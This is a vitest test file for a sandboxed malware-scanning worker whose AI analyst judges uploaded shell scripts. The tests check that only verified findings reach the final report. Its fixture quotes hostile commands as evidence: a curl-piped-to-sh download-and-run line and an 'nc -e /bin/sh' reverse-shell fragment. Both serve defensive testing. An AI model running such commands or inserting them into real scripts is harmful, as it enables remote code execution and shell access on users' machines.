import { describe, expect, it } from 'vitest'
import { runWorkerB, workerBConfigured, workerBReport, type WorkerBResult } from './workerB'

export function bResult(
  over: Partial<WorkerBResult['analysis'] & object> = {},
  top: Partial<WorkerBResult> = {}
): WorkerBResult {
  return {
    worker: 'B',
    provider: 'chalk',
    sha256: 'a'.repeat(64),
    sandbox_id: 'csbx-1',
    ms: 41_000,
    sandbox_log: [
      {
        at: '2026-10-18T03:00:00Z',
        step: 'create (Chalk sandbox)',
        ok: true,
        ms: 1800,
        detail: 'sandbox csbx-1'
      },
      {
        at: '2026-10-18T03:00:02Z',
        step: 'network probe (4 hosts × curl, python)',
        ok: true,
        ms: 5200,
        detail: 'all blocked'
      },
      {
        at: '2026-10-18T03:00:07Z',
        step: 'upload + SHA-256 check',
        ok: true,
        ms: 300,
        detail: '120 bytes'
      },
      { at: '2026-10-18T03:00:40Z', step: 'terminate', ok: true, ms: 200, detail: 'csbx-1' }
    ],
    analysis: {
      verdict: 'malicious',
      confidence: 'high',
      summary: 'Downloads a script from the internet and runs it.',
      file_type: 'POSIX shell script',
      playbook_rows: ['.sh, .bash, .ps1'],
      vulnerabilities: [
        {
          type: 'Remote script execution',
          severity: 'critical',
          tool: 'code_patterns',
          location: 'line 2',
          evidence: 'curl -s https://example.invalid/agent.sh | sh',
          explanation: 'pipes a download into sh',
          verified: true
        },
        {
          type: 'Invented',
          severity: 'high',
          tool: 'bandit',
          location: 'line 9',
          evidence: 'nc -e /bin/sh',
          explanation: 'not in the file',
          verified: false
        }
      ],
      unknowns: [],
      tool_log: [{ tool: 'identify' }, { tool: 'code_patterns' }],
      model: 'anthropic/claude-opus-5-5',
      turns: 3,
      stop: 'submitted',
      analyst: 'agent',
      ...over
    },
    ...top
  }
}

describe('Worker B result → report', () => {
  it('keeps only verified findings as reasons and evidence', () => {
    const rep = workerBReport(bResult(), 'zoom-update.sh')
    expect(rep.verdict).toBe('malicious')
    expect(rep.analysed).toBe(true)
    expect(rep.reasons).toHaveLength(1)
    expect(rep.reasons[0].text).toContain('Remote script execution (line 2)')
    expect(rep.code).toEqual([
      expect.objectContaining({
        startLine: 2,
        lines: ['curl -s https://example.invalid/agent.sh | sh']
      })
    ])
    expect(rep.sandbox).toMatchObject({ provider: 'chalk', network: 'off', sandboxId: 'csbx-1' })
    expect(rep.sandbox?.destroyedAt).toBe('2026-10-18T03:00:40Z')
    expect(rep.checks.map((c) => c.name)).toEqual([
      'Chalk sandbox (Worker B)',
      'Worker B analyst (Claude via Chalk)'
    ])
  })

  it('a rules-only answer is not an analysis', () => {
    const rep = workerBReport(
      bResult({ analyst: 'rules', verdict: 'clean', vulnerabilities: [] }),
      'a.sh'
    )
    expect(rep.analysed).toBe(false)
    expect(rep.checks[1].name).toBe('Worker B (rules only)')
  })

  it('reports a sandbox that failed before any analysis', () => {
    const rep = workerBReport(
      bResult(
        {},
        {
          analysis: undefined,
          sandbox_id: undefined,
          error: 'RuntimeError: could reach the network'
        }
      ),
      'a.sh'
    )
    expect(rep.verdict).toBeNull()
    expect(rep.checks[0]).toMatchObject({ state: 'fail' })
    expect(rep.sandbox).toBeNull()
  })
})

describe('running Worker B', () => {
  it('sends the bytes and parses the result', async () => {
    let sent = ''
    const res = await runWorkerB(
      Buffer.from('#!/bin/sh\n'),
      { filename: 'a.sh', scanId: 's1' },
      {
        root: '/x',
        via: 'local',
        spawnWorker: async (input) => {
          sent = input
          return { code: 0, stdout: JSON.stringify(bResult()), stderr: '' }
        }
      }
    )
    expect(JSON.parse(sent)).toEqual({
      filename: 'a.sh',
      data_b64: 'IyEvYmluL3NoCg==',
      scan_id: 's1',
      via: 'local'
    })
    expect(res.analysis?.verdict).toBe('malicious')
  })

  it('throws with the last stderr line when there is no result', async () => {
    await expect(
      runWorkerB(
        Buffer.from('x'),
        { filename: 'a', scanId: 's' },
        {
          root: '/x',
          spawnWorker: async () => ({
            code: 1,
            stdout: '',
            stderr: 'step\nPermissionDenied: deploy.create\n'
          })
        }
      )
    ).rejects.toThrow(/exit 1\): PermissionDenied: deploy.create/)
  })

  it('needs all three Chalk credentials', () => {
    expect(
      workerBConfigured({ CHALK_CLIENT_ID: 'a', CHALK_CLIENT_SECRET: 'b', CHALK_ENVIRONMENT: 'c' })
    ).toBe(true)
    expect(
      workerBConfigured({ CHALK_CLIENT_ID: 'a', CHALK_CLIENT_SECRET: '', CHALK_ENVIRONMENT: 'c' })
    ).toBe(false)
  })
})
